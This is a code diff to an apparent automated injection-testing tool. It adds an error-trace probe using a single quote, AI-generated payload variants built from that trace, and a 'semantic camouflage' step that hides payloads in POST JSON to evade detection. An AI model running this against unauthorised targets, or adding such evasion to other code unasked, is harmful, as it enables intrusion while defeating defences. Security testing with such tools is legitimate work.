@@ -50,9 +50,28 @@ class AdvancedPayloadAdapter(EngineAdapter):
                 for base_payload in base_payloads[:max(1, self.config.max_payloads // 10)]:
                     mutator = PayloadMutationEngine(base_payload, mutation_level=self.config.custom_params.get("mutation_level", 2))
 
-                    # Generate up to max_payloads variants
-                    mutations = mutator.generate_variants(
-                        target_count=min(100, self.config.max_payloads // len(base_payloads))
+                    # [P5-A] Probe target to get error trace context for Cortex AI
+                    probe_payload = base_payload + "'"
+                    error_trace = ""
+                    try:
+                        async with session.get(
+                            f"{target}{endpoint}",
+                            params={parameter: probe_payload},
+                            timeout=aiohttp.ClientTimeout(total=5),
+                            ssl=False
+                        ) as probe_resp:
+                            resp_text = await probe_resp.text()
+                            if probe_resp.status >= 500 or any(kw in resp_text.lower() for kw in ["syntax", "error", "exception", "traceback"]):
+                                error_trace = resp_text[:2000]  # Grab trace
+                                logger.debug(f"Captured error trace for AI context on {endpoint}")
+                    except Exception as e:
+                        logger.debug(f"Probe error: {e}")
+
+                    # [P5-A] Generate smart variants with Gemini (falls back to heuristic)
+                    mutations = await mutator.generate_smart_variants(
+                        context={"vector": "Custom", "url": target, "parameter": parameter, "dbms": "Auto", "os": "Auto"},
+                        error_trace=error_trace,
+                        target_count=min(100, max(5, self.config.max_payloads // len(base_payloads)))
                     )
 
                     for mutation in mutations:
@@ -83,16 +102,44 @@ class AdvancedPayloadAdapter(EngineAdapter):
         payload: str,
     ) -> Optional[Finding]:
         """Test single mutation with adaptive feedback"""
+        import json
+        from backend.core.events import CerberusBroadcaster
+        
         try:
             url = f"{target}{endpoint}"
             params = {parameter: payload}
+            
+            method = "GET"
+            req_kwargs = {
+                "timeout": aiohttp.ClientTimeout(total=5),
+                "headers": {"User-Agent": "Mozilla/5.0"},
+                "ssl": False,
+            }
 
-            async with session.get(
+            # [P5-B] Semantic Evasion
+            if self.config.custom_params.get("mutation_level", 2) >= 3:
+                from backend.core.cortex_ai import generate_semantic_camouflage
+                await CerberusBroadcaster.broadcast_ws_message("CERBERUS_PRO", "ai_telemetry", f"🎭 [Cortex AI] Aplicando Semantic Evasion para camuflar payload en {endpoint}...")
+                
+                camouflaged_json = await generate_semantic_camouflage(
+                    payload, {"url": url, "parameter": parameter}
+                )
+                
+                if camouflaged_json:
+                    await CerberusBroadcaster.broadcast_ws_message("CERBERUS_PRO", "ai_telemetry", f"  > ¡Camuflaje Completo! Transportando payload oculto vía POST JSON.")
+                    method = "POST"
+                    req_kwargs["headers"]["Content-Type"] = "application/json"
+                    req_kwargs["data"] = camouflaged_json
+                else:
+                    await CerberusBroadcaster.broadcast_ws_message("CERBERUS_PRO", "ai_telemetry", f"⚠️ Fallo al generar camuflaje semántico. Fallback a inyección GET bruta.")
+                    req_kwargs["params"] = params
+            else:
+                req_kwargs["params"] = params
+
+            async with session.request(
+                method,
                 url,
-                params=params,
-                timeout=aiohttp.ClientTimeout(total=5),
-                headers={"User-Agent": "Mozilla/5.0"},
-                ssl=False,
+                **req_kwargs
             ) as resp:
                 text = await resp.text()
 
